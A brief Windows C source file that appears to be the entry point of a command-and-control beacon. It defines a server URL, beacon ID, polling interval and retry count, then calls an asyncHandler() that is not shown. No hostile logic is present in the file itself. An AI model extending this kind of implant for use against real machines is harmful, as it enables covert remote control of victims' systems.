#include <Windows.h>
#include "helpers.h"

//----------------[config]--------------------------------------------------//

#ifndef SERVER_URL
#define SERVER_URL "http://127.0.0.1:8080"
#endif

#ifndef BEACON_ID
#define BEACON_ID "beacon001"
#endif

#ifndef POLLING_INTERVAL
#define POLLING_INTERVAL 5000
#endif

#ifndef MAX_RETRIES
#define MAX_RETRIES 3
#endif

//----------------[globals]-------------------------------------------------//

char* g_serverUrl = SERVER_URL;
char* g_beaconId = BEACON_ID;
int g_pollingInterval = POLLING_INTERVAL;
int g_maxRetries = MAX_RETRIES;

//----------------[entry]---------------------------------------------------//

int main() {
	asyncHandler();
	return 0;
}